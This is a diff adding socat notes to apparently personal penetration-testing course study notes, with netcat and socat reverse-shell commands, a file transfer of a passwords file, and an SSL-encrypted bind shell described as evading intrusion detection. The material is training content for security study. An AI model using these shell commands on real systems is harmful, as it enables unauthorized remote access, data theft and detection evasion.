@@ -48,6 +48,10 @@
     - [Remote Administration with Netcat](#Remote-Administration-with-Netcat)
         - [Netcat Bind Shell Scenario](#Netcat-Bind-Shell-Scenario)
         - [Reverse Shell Scenario](#Reverse-Shell-Scenario)
+    3.2. [socat](#socat)
+    - [Transferring Files with Socat](#Transferring-Files-with-Socat)
+    - [Socat Reverse Shells](#Socat-Reverse-Shells)
+    - [Socat Encrypted Bind Shells](#Socat-Encrypted-Bind-Shells)
 # Getting Comfortable with Kali Linux
 ## Finding Files in Kali Linux
 ### which 
@@ -334,5 +338,45 @@ listening on [any] 4444 ...
 kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash
 (UNKNOWN) [10.11.0.22] 4444 (?) open
 ```
+## socat
+### Transferring Files with Socat
+```console
+#server
+kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+#fork creates a child process once a connection is made, which allows multiple connections, file: name of a file
+#client
+C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
+#create - a new file will be created
+```
+### Socat Reverse Shells
+```console
+#local
+C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
+#-d -d: increase verbosity, STDOUT: connect standard output (STDOUT) to the TCP socket
+#target
+kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+```
+### Socat Encrypted Bind Shells
+Rely on SSL. This will assist in evading intrusion detection systems (IDS) and help hide the sensitive data we are transceiving.
+- req: initiate a new certificate signing request
+- -newkey: generate a new private key
+- rsa:2048: use RSA encryption with a 2,048-bit key length
+- -nodes: store the private key without passphrase protection
+- -keyout: save the key to a file
+- -x509: output a self-signed certificate instead of a certificate request
+- -days: set validity period in days
+- -out: save the certificate to a file
+```console
+#create a self-signed certificate
+kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+#cat the certificate and its private key into a file, which we will eventually use to encrypt our bind shell (convert to a format socat will accept)
+kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
+#listener - verify=0: disable SSL verification
+kali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+#bind: use - to transfer data between STDIO and the remote host.
+C:\Users\offsec> socat - OPENSSL:10.11.0.4:443,verify=0
+```
+
+
 
 
